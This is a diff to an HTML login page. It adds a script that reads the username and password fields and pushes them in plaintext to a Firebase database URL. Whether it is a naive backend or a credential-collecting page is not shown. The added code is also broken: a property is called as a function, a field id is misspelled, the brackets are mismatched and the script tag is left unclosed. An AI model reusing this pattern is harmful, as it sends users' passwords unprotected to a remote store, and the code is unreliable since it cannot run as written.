@@ -26,9 +26,21 @@
                 <input id="username" type="text" class="form-control" name="Username" placeholder="Username" required="" autofocus="" />
                 <input id="password" type="password" class="form-control" name="Password" placeholder="Password" required=""/>     		  
                 
-                <button class="btn btn-lg btn-primary btn-block"  name="Submit" value="Login" type="Submit">Login</button>  			
+                <button onclick="submitForm()" class="btn btn-lg btn-primary btn-block"  name="Submit" value="Login" type="Submit">Login</button>  			
             </form>			
         </div>
     </div>
+
+    <script type="text/javascript"> 
+    function submitForm() {
+        var usersInfo = firebase("https://untilafter-ef04f.firebaseio.com");
+            var username = document.getElementById("username").value();
+            var password = document.getElementById("passsword").value();
+
+        usersInfo.push({
+            username: username,
+            password: password
+        )};
+    }
 
 </body>
